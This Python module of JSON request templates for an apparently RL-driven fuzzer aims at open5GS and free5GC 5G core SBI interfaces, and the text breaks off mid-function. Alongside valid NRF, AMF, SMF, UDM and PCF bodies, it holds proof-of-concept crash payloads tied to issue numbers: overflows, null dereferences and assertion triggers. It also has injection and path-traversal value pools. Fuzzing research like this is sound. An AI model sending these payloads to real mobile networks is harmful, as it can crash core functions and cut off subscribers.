#!/usr/bin/env python3
"""
JSON body templates for 5G SBI (Service-Based Interface) procedures.

Covers 3GPP TS 29.510 (NRF), 29.518 (AMF), 29.502 (SMF) SBI API procedures
targeting open5GS NFs.

Each template is a dict returned by a builder function that accepts semantic
field overrides.  The dicts are serialised to JSON bytes in adapter.build_message().
"""

import json
import uuid
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Default field values (match open5GS default sample configuration)
# ---------------------------------------------------------------------------

DEFAULT_MCC            = '001'
DEFAULT_MNC            = '01'
DEFAULT_TAC            = '000001'
DEFAULT_CELL_ID        = '000000010'
DEFAULT_AMF_ID         = '020040'
DEFAULT_AMF_SET_ID     = '3ff'
DEFAULT_AMF_REGION_ID  = '01'
DEFAULT_DNN            = 'internet'
DEFAULT_SNSSAI_SST     = 1
DEFAULT_SNSSAI_SD      = '010203'
DEFAULT_SUPI           = 'imsi-001010000000001'
DEFAULT_AMF_SBI_URI    = 'http://127.0.0.5:7777'
DEFAULT_SMF_SBI_URI    = 'http://127.0.0.4:7777'
DEFAULT_NRF_SBI_URI    = 'http://127.0.0.10:7777'

# Fixed UUIDs used as NF instance IDs in templates
NF_INSTANCE_AMF  = '22222222-2222-2222-2222-222222222222'
NF_INSTANCE_SMF  = '33333333-3333-3333-3333-333333333333'
NF_INSTANCE_FUZZ = '11111111-1111-1111-1111-111111111111'


def _plmn(mcc: str, mnc: str) -> Dict[str, str]:
    return {'mcc': mcc, 'mnc': mnc}


def _snssai(sst: int, sd: str) -> Dict[str, Any]:
    d: Dict[str, Any] = {'sst': sst}
    if sd:
        d['sd'] = sd
    return d


# ---------------------------------------------------------------------------
# NRF procedures  (TS 29.510)
# ---------------------------------------------------------------------------

def nf_profile_amf(nf_instance_id: str = NF_INSTANCE_FUZZ,
                   mcc: str = DEFAULT_MCC,
                   mnc: str = DEFAULT_MNC,
                   sst: int = DEFAULT_SNSSAI_SST,
                   sd: str = DEFAULT_SNSSAI_SD,
                   nf_status: str = 'REGISTERED') -> Dict[str, Any]:
    """NF Profile body for NRF NF registration (AMF).

    PUT /nnrf-nfm/v1/nf-instances/{nfInstanceId}
    3GPP TS 29.510 §6.1.6.2
    """
    return {
        'nfInstanceId': nf_instance_id,
        'nfType':       'AMF',
        'nfStatus':     nf_status,
        'plmnList':     [_plmn(mcc, mnc)],
        'sNssais':      [_snssai(sst, sd)],
        # Use 127.0.99.1 — avoids collisions with real open5GS NF addresses
        # (AMF=127.0.0.5, SMF=127.0.0.4, etc.) which cause UnRef warnings and
        # HTTP 500 when the NRF tries to update existing endpoint references.
        'ipv4Addresses': ['127.0.99.1'],
        'allowedNfTypes': ['SMF', 'PCF', 'UDM'],
        'amfInfo': {
            'amfSetId':    DEFAULT_AMF_SET_ID,
            'amfRegionId': DEFAULT_AMF_REGION_ID,
            'guamiList': [{
                'plmnId': _plmn(mcc, mnc),
                'amfId':  DEFAULT_AMF_ID,
            }],
            'taiList': [{
                'plmnId': _plmn(mcc, mnc),
                'tac':    DEFAULT_TAC,
            }],
        },
        'nfServices': [{
            'serviceInstanceId': 'namf-comm',
            'serviceName':       'namf-comm',
            'versions':          [{'apiVersionInUri': 'v1', 'apiFullVersion': '1.0.2'}],
            'scheme':            'http',
            'nfServiceStatus':   nf_status,
            'ipEndPoints': [{'ipv4Address': '127.0.99.1', 'port': 7777}],
            'apiPrefix':         'http://127.0.99.1:7777/namf-comm/v1',
        }],
    }


def nf_profile_smf(nf_instance_id: str = NF_INSTANCE_FUZZ,
                   mcc: str = DEFAULT_MCC,
                   mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """NF Profile body for SMF registration."""
    return {
        'nfInstanceId': nf_instance_id,
        'nfType':       'SMF',
        'nfStatus':     'REGISTERED',
        'plmnList':     [_plmn(mcc, mnc)],
        'sNssais':      [_snssai(DEFAULT_SNSSAI_SST, DEFAULT_SNSSAI_SD)],
        'ipv4Addresses': ['127.0.0.4'],
        'smfInfo': {
            'sNssaiSmfInfoList': [{
                'sNssai': _snssai(DEFAULT_SNSSAI_SST, DEFAULT_SNSSAI_SD),
                'dnnSmfInfoList': [{'dnn': DEFAULT_DNN}],
            }],
        },
    }


def nf_profile_malformed(nf_instance_id: str = NF_INSTANCE_FUZZ) -> Dict[str, Any]:
    """Malformed NF Profile: missing mandatory nfType / nfStatus fields."""
    return {
        'nfInstanceId': nf_instance_id,
        # nfType intentionally omitted → open5GS NRF should reject with 400
    }


def nf_profile_type_mismatch(nf_instance_id: str = NF_INSTANCE_FUZZ,
                              mcc: str = DEFAULT_MCC,
                              mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """NF Profile with cross-field inconsistency: nfType=AMF but SMF-style info.

    Passes JSON schema validation (all mandatory fields present) but the NRF's
    NF-type-specific merge logic in nrf-context.c receives amfInfo=NULL while
    smfInfo is populated, which can trigger NULL dereferences in the AMF branch.
    """
    return {
        'nfInstanceId': nf_instance_id,
        'nfType':       'AMF',          # says AMF …
        'nfStatus':     'REGISTERED',
        'plmnList':     [_plmn(mcc, mnc)],
        'sNssais':      [_snssai(DEFAULT_SNSSAI_SST, DEFAULT_SNSSAI_SD)],
        'ipv4Addresses': ['127.0.99.2'],
        'allowedNfTypes': ['SMF', 'PCF', 'UDM'],
        # … but carries smfInfo instead of amfInfo
        'smfInfo': {
            'sNssaiSmfInfoList': [{
                'sNssai': _snssai(DEFAULT_SNSSAI_SST, DEFAULT_SNSSAI_SD),
                'dnnSmfInfoList': [{'dnn': DEFAULT_DNN}],
            }],
        },
        'nfServices': [{
            'serviceInstanceId': 'nsmf-pdusession',
            'serviceName':       'nsmf-pdusession',
            'versions':          [{'apiVersionInUri': 'v1', 'apiFullVersion': '1.0.0'}],
            'scheme':            'http',
            'nfServiceStatus':   'REGISTERED',
            'ipEndPoints': [{'ipv4Address': '127.0.99.2', 'port': 7777}],
        }],
    }


def nf_subscription(nf_instance_id: str = NF_INSTANCE_FUZZ,
                    mcc: str = DEFAULT_MCC,
                    mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """NF status subscription body.

    POST /nnrf-nfm/v1/subscriptions
    3GPP TS 29.510 §6.1.8.2

    Rules from open5GS nnrf-handler.c:
    - subscriptionId must NOT be sent by the requester (assigned by NRF)
    - subscrCond is mandatory (open5GS rejects with ERROR if absent)
    """
    return {
        'nfStatusNotificationUri': f'http://127.0.0.1:9090/nnrf-callback/v1/status',
        'subscrCond': {'nfType': 'AMF'},   # mandatory per open5GS NRF handler
        'reqNfType':  'AMF',
        'reqNfInstanceId': nf_instance_id,
        'validityTime': '2030-01-01T00:00:00Z',
        # subscriptionId intentionally omitted — assigned by NRF, not the client
    }


# ---------------------------------------------------------------------------
# AMF procedures  (TS 29.518)
# ---------------------------------------------------------------------------

def ue_context_create(supi: str = DEFAULT_SUPI,
                      mcc: str = DEFAULT_MCC,
                      mnc: str = DEFAULT_MNC,
                      sst: int = DEFAULT_SNSSAI_SST) -> Dict[str, Any]:
    """UE Context creation body.

    PUT /namf-comm/v1/ue-contexts/{ueContextId}
    3GPP TS 29.518 §6.3.2
    """
    return {
        'supi': supi,
        'supiUnauthInd': False,
        'gpsi': '',
        'pei': '',
        'udmGroupId': '',
        'ausfGroupId': '',
        'routingIndicator': '0000',
        'hNwPubKeyIdentifiers': [],
        'restrictedRatList': [],
        'forbiddenAreaList': [],
        'serviceAreaRestriction': {},
        'restrictedCoreNWTypeList': [],
        'eventSubscriptionList': [],
        'mmContextList': [{
            'accessType': '3GPP_ACCESS',
            'nas5gSecurity': {
                'integrityAlg': 'NIA1_128',
                'cipheringAlg': 'NEA1_128',
                'ngKsi': {'tscIndication': 'NATIVE', 'ksi': 0},
                'key5GsIntProtActiveFlag': True,
            },
            'nssai': {
                'defaultSingleNssais': [_snssai(sst, DEFAULT_SNSSAI_SD)],
                'singleNssais': [],
            },
            'allowedNssai': [{
                'allowedSnssaiList': [_snssai(sst, DEFAULT_SNSSAI_SD)],
                'accessType': '3GPP_ACCESS',
            }],
            'ueSecurityCapability': '0000000000000000',
        }],
        'sessionContextList': [],
        'traceData': None,
    }


def ue_context_create_bad_supi(supi: str) -> Dict[str, Any]:
    """UE Context with a malformed / boundary SUPI value."""
    body = ue_context_create()
    body['supi'] = supi
    return body


def n1n2_message_transfer(supi: str = DEFAULT_SUPI,
                          pdu_session_id: int = 1,
                          mcc: str = DEFAULT_MCC,
                          mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """N1N2MessageTransfer body (AMF sends N1/N2 to UE/gNB).

    POST /namf-comm/v1/ue-contexts/{ueContextId}/n1-n2-messages
    3GPP TS 29.518 §6.1.3.5
    """
    return {
        'n2InfoContainer': {
            'n2InformationType': 'PDU_RES_SETUP',
            'smInfo': {
                'pduSessionId': pdu_session_id,
                'n2InfoContent': {
                    'ngapIeType': 'PDU_RES_SETUP_REQ',
                    'ngapData': {'contentId': 'n2sm'},
                },
                'sNssai': _snssai(DEFAULT_SNSSAI_SST, DEFAULT_SNSSAI_SD),
            },
        },
        'n1MessageContainer': {
            'n1MessageClass': 'SM',
            'n1MessageContent': {'contentId': '5gnas-sm'},
        },
        'pduSessionId': pdu_session_id,
        'pduSessionResource': {
            'nrAddress': {'ipv4Addr': '127.0.1.1'},
            'teid':      '00000001',
        },
        'skipInd': False,
    }


def amf_event_subscription(nf_instance_id: str = NF_INSTANCE_FUZZ) -> Dict[str, Any]:
    """AMF event subscription body.

    POST /namf-evts/v1/subscriptions
    3GPP TS 29.518 §6.2.2.3
    """
    return {
        'subscription': {
            'eventList': [
                {'type': 'REGISTRATION_STATE_REPORT'},
                {'type': 'CONNECTIVITY_STATE_REPORT'},
                {'type': 'REACHABILITY_REPORT'},
            ],
            'notifyCorrelationId': f'fuzz-{nf_instance_id[:8]}',
            'nfId': nf_instance_id,
            'options': {
                'trigger':       'CONTINUOUS',
                'maxReports':    100,
                'expiry':        '2030-01-01T00:00:00Z',
                'samplingRatio': 100,
            },
        },
    }


# ---------------------------------------------------------------------------
# SMF procedures  (TS 29.502)
# ---------------------------------------------------------------------------

def sm_context_create(supi: str = DEFAULT_SUPI,
                      pdu_session_id: int = 1,
                      dnn: str = DEFAULT_DNN,
                      sst: int = DEFAULT_SNSSAI_SST,
                      sd: str = DEFAULT_SNSSAI_SD,
                      mcc: str = DEFAULT_MCC,
                      mnc: str = DEFAULT_MNC,
                      access_type: str = '3GPP_ACCESS',
                      rat_type: str = 'NR',
                      nf_instance_id: str = NF_INSTANCE_FUZZ) -> Dict[str, Any]:
    """SM Context creation body (AMF → SMF).

    POST /nsmf-pdusession/v1/sm-contexts
    3GPP TS 29.502 §5.2.2.2
    """
    return {
        'supi':          supi,
        'pduSessionId':  pdu_session_id,
        'dnn':           dnn,
        'sNssai':        _snssai(sst, sd),
        'servingNfId':   nf_instance_id,
        'guami': {
            'plmnId': _plmn(mcc, mnc),
            'amfId':  DEFAULT_AMF_ID,
        },
        'servingNetwork': _plmn(mcc, mnc),
        'requestType':    'INITIAL_REQUEST',
        'n1SmMsg':        {'contentId': '5gnas-sm'},
        'anType':         access_type,
        'ratType':        rat_type,
        'ueLocation': {
            'nrLocation': {
                'ncgi': {
                    'plmnId':   _plmn(mcc, mnc),
                    'nrCellId': DEFAULT_CELL_ID,
                },
                'tai': {
                    'plmnId': _plmn(mcc, mnc),
                    'tac':    DEFAULT_TAC,
                },
                'ageOfLocationInformation': 0,
            },
        },
        'ueTimeZone':            '+00:00',
        'smContextStatusUri':    f'{DEFAULT_AMF_SBI_URI}/namf-callback/v1/{supi}/sm-context-status/{pdu_session_id}',
        # NOTE: pcfId / hSmfUri / additionalAnType deliberately omitted — open5GS
        # treats an empty-string hSmfUri as truthy and forces the HR-roaming path
        # ("Full DNN required for HR Roaming"), so the SM context create never
        # establishes.  Omitting them keeps this on the non-roaming (LBO) path.
        'epsInterworkingInd':    'NONE',
        'hoState':               'NONE',
        'toBeSwitch':            False,
        'failedToBeSwitched':    False,
    }


def sm_context_create_wrong_plmn(supi: str = DEFAULT_SUPI,
                                  pdu_session_id: int = 1) -> Dict[str, Any]:
    """SM Context with mismatched PLMN (not configured in open5GS)."""
    body = sm_context_create(supi=supi, pdu_session_id=pdu_session_id)
    body['guami']['plmnId']    = _plmn('000', '00')
    body['servingNetwork']      = _plmn('000', '00')
    body['ueLocation']['nrLocation']['ncgi']['plmnId'] = _plmn('000', '00')
    body['ueLocation']['nrLocation']['tai']['plmnId']  = _plmn('000', '00')
    return body


def sm_context_modify(pdu_session_id: int = 1,
                      supi: str = DEFAULT_SUPI,
                      n2sm_info_type: str = 'PDU_RES_SETUP_RSP') -> Dict[str, Any]:
    """SM Context modification body.

    POST /nsmf-pdusession/v1/sm-contexts/{smContextRef}/modify
    3GPP TS 29.502 §5.2.3.2

    n2sm_info_type='PDU_RES_SETUP_REQ' (wrong for modify) → triggers assert
    in open5GS nsmf-handler.c:364 (issue #4408, unfixed in v2.7.7).
    """
    return {
        'supi':              supi,
        'pduSessionId':      pdu_session_id,
        'n2SmInfo':          {'contentId': 'n2sm'},
        'n2SmInfoType':      n2sm_info_type,
        'n1SmMsg':           {'contentId': '5gnas-sm'},
        'hoState':           'NONE',
        'toBeSwitched':      False,
        'failedToBeSwitched': False,
        'cause':             'REACTIVATION_REQUESTED',
    }


def sm_context_modify_wrong_state(pdu_session_id: int = 1,
                                  supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
    """SM Context modify with PDU_RES_SETUP_REQ (wrong type for modify state).

    Reproduces open5GS issue #4408: assert in nsmf-handler.c:364
    'Invalid STATE' when AMF sends PDU_RES_SETUP_REQ on an existing context.
    """
    return sm_context_modify(pdu_session_id, supi,
                             n2sm_info_type='PDU_RES_SETUP_REQ')


def sm_context_release(cause: str = 'REL_DUE_TO_REACTIVATION') -> Dict[str, Any]:
    """SM Context release body.

    POST /nsmf-pdusession/v1/sm-contexts/{smContextRef}/release
    3GPP TS 29.502 §5.2.4.2
    """
    return {
        'cause':     cause,
        'ngApCause': {'group': 0, 'value': 0},
        'h0': True,
    }


# ---------------------------------------------------------------------------
# v2.7.7 exact-PoC payloads  (one request per known bug)
# ---------------------------------------------------------------------------

def nf_profile_scp_overflow(nf_instance_id: str = NF_INSTANCE_FUZZ,
                            n: int = 9) -> Dict[str, Any]:
    """NF profile with n scpDomainInfoList entries.

    handle_scp_info() copies into a fixed 8-slot stack array.  n > 8 overflows.
    n is driven by the array_count semantic field so the RL agent can discover
    the crash threshold without an exact hardcoded payload.
    """
    return {
        'nfInstanceId': nf_instance_id,
        'nfType':       'SCP',
        'nfStatus':     'REGISTERED',
        'scpInfo': {
            'scpDomainInfoList': {
                f'scp-domain-{i}.example.com': {
                    'domainName': f'scp-domain-{i}.example.com',
                    'fqdn':       f'scp{i}.example.com',
                    'capacity':   100,
                }
                for i in range(n)
            },
            'scpPorts': {'http': 8080},
        },
    }


def udm_purgeflag_body(mcc: str = DEFAULT_MCC,
                       mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """PATCH body with purgeFlag:true and a matching Guami.

    The UDM PATCH handler checks memcmp(recv_guami, udm_ue->guami) before
    reaching the ogs_assert(amf_3gpp_access_registration) at line 454.
    Including a Guami that matches the one stored during registration gets the
    request past the 403-Forbidden Guami-mismatch check so the purge code path
    is actually exercised (#4420 regression / incomplete-patch probe).
    """
    return {
        'guami': {
            'plmnId': _plmn(mcc, mnc),
            'amfId':  DEFAULT_AMF_ID,
        },
        'purgeFlag': True,
    }


def ue_context_oversized_nssais(supi: str = DEFAULT_SUPI,
                                 num_nssais: int = 9) -> Dict[str, Any]:
    """UE context with >8 defaultSingleNssais — triggers #4403 AMF assertion.

    OGS_MAX_NUM_OF_SLICE=8; sending 9 causes an out-of-bounds write in
    AMF's nudm-handler.c:95-116.
    """
    nssais = [{'sst': (i % 255) + 1} for i in range(num_nssais)]
    return {
        'supi':          supi,
        'supiUnauthInd': False,
        'mmContextList': [{
            'accessType': '3GPP_ACCESS',
            'nssai': {
                'defaultSingleNssais': nssais,
                'singleNssais':        [],
            },
            'allowedNssai':         [],
            'ueSecurityCapability': '0000000000000000',
        }],
        'sessionContextList': [],
        'traceData': None,
    }


# ---------------------------------------------------------------------------
# AMF callback / comm procedures  (TS 29.518 §6.3, §6.1)
# ---------------------------------------------------------------------------

def ue_context_transfer_body(supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
    """POST /namf-comm/v1/ue-contexts/{ueContextId}/transfer body.

    Empty / minimal body → #4397/#4402 null-deref crash in AMF.
    Any body triggers the transfer handler before context exists.
    """
    return {'supi': supi}


def amf_comm_sub_create_body(nf_instance_id: str = NF_INSTANCE_FUZZ) -> Dict[str, Any]:
    """POST /namf-comm/v1/subscriptions — AMF status subscription.

    #876/#902: POST then DELETE sequence panics on free of stale pointer.
    """
    return {
        'amfStatusUri': f'http://127.0.0.5:7777/namf-comm/v1/subscriptions/fuzz-cb',
        'guamiList': [{
            'plmnId': _plmn(DEFAULT_MCC, DEFAULT_MNC),
            'amfId':  DEFAULT_AMF_ID,
        }],
        'nfId': nf_instance_id,
    }


def amf_callback_sdm_notify_body() -> Dict[str, Any]:
    """POST /namf-callback/v1/{ctx}/sdmsubscription-notify body.

    #4395: AMF nil-deref when notification context is unknown.
    Empty body ensures the handler dereferences the subscription pointer.
    """
    return {
        'notifyItems': [{'resourceId': 'imsi-001010000000001', 'changeItems': []}],
        'subscription': '/nudm-sdm/v2/imsi-001010000000001/sdm-subscriptions/1',
    }


def amf_callback_n1_notify_body() -> Dict[str, Any]:
    """POST /namf-callback/v1/n1-message-notify body.

    #1029 free5GC: ranNodeId=null → nil deref in AMF AmfRanFindByRanID().
    """
    return {
        'ranNodeId':   None,        # nil RanNodeId triggers panic
        'n1MessageContainer': {
            'n1MessageClass':   'SM',
            'n1MessageContent': {'contentId': '5gnas-sm'},
        },
    }


# ---------------------------------------------------------------------------
# AUSF procedures  (TS 29.509)
# ---------------------------------------------------------------------------

def ausf_auth_create_body(supi: str = DEFAULT_SUPI,
                          mcc: str = DEFAULT_MCC,
                          mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications body.

    #1030/#4472/#4523: triggers decodeEapAkaPrime / UE auth path.
    supiOrSuci can be SUPI or SUCI format — fuzz both.
    """
    return {
        'supiOrSuci':         supi,
        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
        'resynchronizationInfo': None,
    }


def ausf_eap_session_body(eap_payload: str = 'AgAABBMA') -> Dict[str, Any]:
    """POST /nausf-auth/v1/ue-authentications/{authCtxId}/eap-session body.

    #1030/#982/#983: decodeEapAkaPrime panics on short/malformed eapPayload.
    Default is a 6-byte base64 payload — too short for attribute parsing loop.
    Mutations sweep through short values to find the exact OOB threshold.
    """
    return {'eapPayload': eap_payload}


# ---------------------------------------------------------------------------
# UDM procedures  (TS 29.503, 29.505)
# ---------------------------------------------------------------------------

def udm_auth_data_body(supi: str = DEFAULT_SUPI,
                       mcc: str = DEFAULT_MCC,
                       mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nudm-ueau/v1/{supi}/security-information/generate-auth-data body.

    #4418/#1037: nil sequenceNumber deref when SUPI has no auth subscription.
    Using an unprovisioned SUPI forces the nil-seqNum code path.
    """
    return {
        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
        'ausfInstanceId':     NF_INSTANCE_FUZZ,
        'resynchronizationInfo': None,
    }


def udm_sdm_sub_create_body(supi: str = DEFAULT_SUPI,
                            mcc: str = DEFAULT_MCC,
                            mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /nudm-sdm/v2/{supi}/sdm-subscriptions — valid SdmSubscription.

    Producer step of the UDM subscription-lifecycle chain: a complete body that
    returns 201 + Location so the real subscriptionId propagates to the
    modify / delete / use-after-delete consumer steps (open5GS rejects the
    generic spec baseline with "No monitoredResourceUri").
    """
    return {
        'nfInstanceId':         NF_INSTANCE_FUZZ,
        'callbackReference':    f'http://127.0.0.5:7777/nudm-sdm-callback/v1/{supi}/sdm-notify',
        'monitoredResourceUris': [f'/nudm-sdm/v2/{supi}/am-data'],
    }


def udm_sdm_sub_modify_body() -> list:
    """PATCH /nudm-sdm/v2/{supi}/sdm-subscriptions/{id} — JSON-patch document.

    Consumer step: a minimal RFC 6902 patch applied to the (possibly already
    deleted) subscription id, exercising the modify / not-found handler path.
    """
    return [
        {'op': 'replace', 'path': '/monitoredResourceUris/0',
         'value': f'/nudm-sdm/v2/{DEFAULT_SUPI}/sm-data'},
    ]


def udm_uecm_amf_reg_body(mcc: str = DEFAULT_MCC,
                           mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """PUT /nudm-uecm/v1/{supi}/registrations/amf-3gpp-access body.

    #4419/#4420: AMF registration update — nil deref when SUPI not found.
    """
    return {
        'amfInstanceId':    NF_INSTANCE_FUZZ,
        'deregCallbackUri': f'http://127.0.0.5:7777/namf-comm/v1/ue-contexts/{DEFAULT_SUPI}/deregistration-data',
        'guami': {
            'plmnId': _plmn(mcc, mnc),
            'amfId':  DEFAULT_AMF_ID,
        },
        'ratType':          'NR',
        'imsVoPs':          'HOMOGENEOUS_NON_SUPPORTING',
    }


# ---------------------------------------------------------------------------
# SMF callback  (TS 29.502 §5.5)
# ---------------------------------------------------------------------------

def smf_policy_notify_body(ctx_id: str = '1') -> Dict[str, Any]:
    """POST /nsmf-callback/v1/sm-policy-notify/{id}/update body.

    #4442/#4453: SMF nil-deref / panic when callback arrives for unknown ctx.
    Sending to a non-existent smPolicyId exercises the not-found error path.
    """
    return {
        'resourceUri':      f'http://127.0.0.1:7777/npcf-smpolicycontrol/v1/sm-policies/{ctx_id}',
        'smPolicyDecision': {},    # empty decision triggers null RouteToLAN deref
    }


# ---------------------------------------------------------------------------
# NRF status notification  (TS 29.510 §6.1.9)
# ---------------------------------------------------------------------------

def nrf_status_notify_body(nf_instance_id: str = NF_INSTANCE_FUZZ,
                            dnn_count: int = 1) -> Dict[str, Any]:
    """POST /nnrf-nfm/v1/nf-status-notify body.

    #4406: oversized smfInfo.dnnInfos in a STATUS_NOTIFY callback crashes AMF.
    dnn_count driven by array_count field so RL agent sweeps to find threshold.
    """
    return {
        'event':          'NF_REGISTERED',
        'nfInstanceUri':  f'http://127.0.0.1:7777/nnrf-nfm/v1/nf-instances/{nf_instance_id}',
        'nfProfile': {
            'nfInstanceId': nf_instance_id,
            'nfType':       'SMF',
            'nfStatus':     'REGISTERED',
            'smfInfo': {
                'sNssaiSmfInfoList': [{
                    'sNssai': _snssai(DEFAULT_SNSSAI_SST, DEFAULT_SNSSAI_SD),
                    'dnnSmfInfoList': [{'dnn': f'internet-{i}'} for i in range(dnn_count)],
                }],
            },
        },
    }


# ---------------------------------------------------------------------------
# Cross-platform templates (free5GC + open5GS attack surface overlap)
# ---------------------------------------------------------------------------

def nrf_oauth2_token_body(target_nf_type: str = 'NOPE',
                          nf_type: str = 'AMF',
                          nf_instance_id: str = NF_INSTANCE_FUZZ) -> Dict[str, Any]:
    """POST /nnrf-nfm/v1/oauth2/token body.

    free5GC #434: NRF panics for unknown targetNfType in /oauth2/token.
    Sending an unrecognised nfType / targetNfType causes a panic in free5GC's
    NrfNfmOauth2TokenPost handler (missing enum guard).
    Cross-platform: open5GS may return 400/501 but exercises the same endpoint.
    """
    return {
        'grant_type':   'client_credentials',
        'nfInstanceId': nf_instance_id,
        'nfType':       nf_type,
        'targetNfType': target_nf_type,   # 'NOPE' → panic in free5GC
        'scope':        'nudr-dr',
    }


def udm_uecm_amf_reg_incomplete(mcc: str = DEFAULT_MCC,
                                 mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """PUT /nudm-uecm/v1/{supi}/registrations/amf-3gpp-access — incomplete body.

    free5GC #761: UDM RegistrationAmf3gppAccessProcedure panics when
    mandatory fields (amfInstanceId, deregCallbackUri) are absent — nil pointer
    when dereferencing the parsed registration struct.
    Complements poc_4420 by attacking the initial PUT path, not the PATCH
    purgeFlag path. Cross-platform: open5GS rejects with 400 on missing fields,
    but some code paths may deref before validation.
    """
    return {
        # amfInstanceId and deregCallbackUri intentionally omitted
        'guami': {
            'plmnId': _plmn(mcc, mnc),
            'amfId':  DEFAULT_AMF_ID,
        },
        'ratType': 'NR',
    }


def amf_evts_sub_modify_body(sub_id: str = '1') -> Dict[str, Any]:
    """PATCH /namf-evts/v1/subscriptions/{subId} body.

    free5GC #754: AMF ModifySubscription panics when the subscription was
    deleted before the PATCH — unchecked nil pointer on the subscription struct.
    The scenario sequence (subscribe then delete then modify) reproduces both
    free5GC panic and open5GS state-machine boundary errors.
    """
    return {
        'subscription': {
            'eventList': [{'type': 'REGISTRATION_STATE_REPORT'}],
            'notifyCorrelationId': f'fuzz-mod-{sub_id}',
            'nfId': NF_INSTANCE_FUZZ,
            'options': {
                'trigger':    'CONTINUOUS',
                'maxReports': 0,           # 0 maxReports: another boundary value
            },
        }
    }


def ue_context_restricted_rat(supi: str = DEFAULT_SUPI,
                               mcc: str = DEFAULT_MCC,
                               mnc: str = DEFAULT_MNC,
                               sst: int = DEFAULT_SNSSAI_SST) -> Dict[str, Any]:
    """UE context body with a non-empty restrictedRatList.

    free5GC #756: AMF RestrictedRatList handler accesses index [0] without
    checking that the list is non-empty — sending one entry triggers the
    unchecked access and can cause nil/bounds panic.
    Cross-platform: open5GS has similar list-traversal code in amf-context.c.
    """
    body = ue_context_create(supi, mcc, mnc, sst)
    body['restrictedRatList'] = ['NR']   # non-empty triggers [0] access
    return body


def ue_context_malformed_gpsi(supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
    """UE context with gpsis:["msisdn"] — triggers #4405 AMF NULL assertion.

    ogs_id_get_value("msisdn") returns NULL because there is no '-' separator;
    the NULL pointer is then asserted in nudm-handler.c:66.
    """
    return {
        'supi':               supi,
        'gpsis':              ['msisdn'],   # missing -<number> suffix
        'supiUnauthInd':      False,
        'mmContextList':      [],
        'sessionContextList': [],
        'traceData':          None,
    }


# ---------------------------------------------------------------------------
# Oversized / malformed payloads  (boundary / attack variants)
# ---------------------------------------------------------------------------

# Each entry is (label, body_bytes) for direct use in build_message()
MALFORMED_BODIES: List[Dict[str, Any]] = [
    # (1) Empty JSON object — triggers mandatory-field missing errors
    {},
    # (2) null body — should return 400 Bad Request
    None,  # handled specially in adapter: sends empty bytes
]

OVERSIZED_BODIES: List[bytes] = [
    # (1) 10 KB JSON string — large allocation test
    json.dumps({'key': 'A' * 10240}).encode(),
    # (2) 100 KB — exercises request-size limits
    json.dumps({'key': 'B' * 102400}).encode(),
    # (3) Deeply nested JSON — stack overflow risk in JSON parser
    json.dumps({'a': {'b': {'c': {'d': {'e': {'f': {'g': {'h': 'deep'}}}}}}}}).encode(),
    # (4) JSON array with 1000 elements — array iteration limit
    json.dumps([{'sst': i, 'sd': f'{i:06x}'} for i in range(1000)]).encode(),
    # (5) Unicode control characters in string values
    json.dumps({'supi': 'imsi-\x00\x01\x02\x03\x04'}).encode(),
    # (6) Binary garbage (not valid JSON at all)
    bytes(range(256)) * 4,
    # (7) JSON with very long key name
    json.dumps({'A' * 1024: 'value'}).encode(),
    # (8) JSON with integer overflow values
    json.dumps({'pduSessionId': 2**63, 'nfInstanceId': -1}).encode(),
]


# ---------------------------------------------------------------------------
# Cross-platform payload value pools (free5GC + open5GS combined)
# ---------------------------------------------------------------------------

# GPSI — General Public Subscription Identifier (3GPP TS 29.571)
# Used in NRF discovery query params and AMF UE context gpsis field.
# free5GC #757: 2-char gpsi → buildFilter computes negative slice length → panic
# free5GC #780: null byte in path param → UDM nil string comparison
# open5GS #4405: "msisdn" (no -<number>) → ogs_id_get_value() returns NULL
GPSI_VALUES = [
    'msisdn-15550001234',               # valid MSISDN
    'external-id-user@domain.com',      # valid external identifier
    'msisdn-',                          # prefix only, no number (#4405 variant)
    'ms',                               # 2-char — slice bounds panic (free5GC #757)
    'm',                                # 1-char — even shorter slice
    '',                                 # empty
    'msisdn-\x00',                      # null byte in value
    'msisdn-' + 'A' * 100,             # oversized MSISDN
    'msisdn-0',                         # 1-digit — minimal MSISDN
    'msisdn-15550001234\x00injected',   # null byte injection (free5GC #780)
    '../admin',                         # path traversal via GPSI
    'msisdn-99999999999999999',         # 17-digit — exceeds E.164 max (15 digits)
]


# ---------------------------------------------------------------------------
# PCF – SM Policy Control  (TS 29.512)
# PCF – AM Policy Control  (TS 29.507)
# PCF – Policy Authorization  (TS 29.514)
# ---------------------------------------------------------------------------

def pcf_sm_policy_create_body(supi: str = DEFAULT_SUPI,
                               pdu_sid: int = 1,
                               dnn: str = DEFAULT_DNN,
                               sst: int = DEFAULT_SNSSAI_SST,
                               sd:  str = DEFAULT_SNSSAI_SD,
                               mcc: str = DEFAULT_MCC,
                               mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
    """POST /npcf-smpolicycontrol/v1/sm-policies body."""
    return {
        'supi':          supi,
        'pduSessionId':  pdu_sid,
        'pduSessionType': 'IPV4',
        'dnn':           dnn,
        'notificationUri': f'http://127.0.0.5:7777/nsmf-callback/v1/sm-policy-notify/{pdu_sid}/update',
        'sNssai':        _snssai(sst, sd),
        'servingNetwork': _plmn(mcc, mnc),
        'ratType':       'NR',
        'accessType':    '3GPP_ACCESS',
        'ipv4Address':   '10.45.0.1',
    }


def pcf_sm_policy_create_no_supi(pdu_sid: int = 1) -> Dict[str, Any]:
    """SM Policy create without SUPI — nil deref in PCF SUPI lookup."""
    return {
        'pduSessionId':  pdu_sid,
        'pduSessionType': 'IPV4',
        'dnn':           DEFAULT_DNN,
        'notificationUri': f'http://127.0.0.5:7777/nsmf-callback/v1/sm-policy-notify/{pdu_sid}/update',
